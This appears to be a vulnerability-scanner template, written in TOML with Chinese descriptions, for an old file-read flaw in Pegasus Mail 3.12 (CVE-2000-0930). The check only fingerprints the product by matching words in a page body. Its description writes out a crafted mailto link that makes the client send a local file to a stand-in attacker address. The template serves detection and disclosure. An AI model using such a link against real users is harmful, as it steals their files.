[info]
author = "ave"
description = '通过 mailto: 协议 -F 参数读取目标任意文件。攻击者构造 mailto:attacker@example.com?-F%20C:\boot.ini 链接嵌入网页或邮件，Pegasus Mail 3.12 用户点击后自动将指定文件作为附件转发给攻击者。'
id = "POC-AVE-2000-0681"
name = "David Harris Pegasus Mail 3.12 任意文件读取漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0681"]
vuln_id = [
    "CVE-2000-0930",
    "AVE-2000-0681",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Pegasus Mail",
    "Pegasus",
]
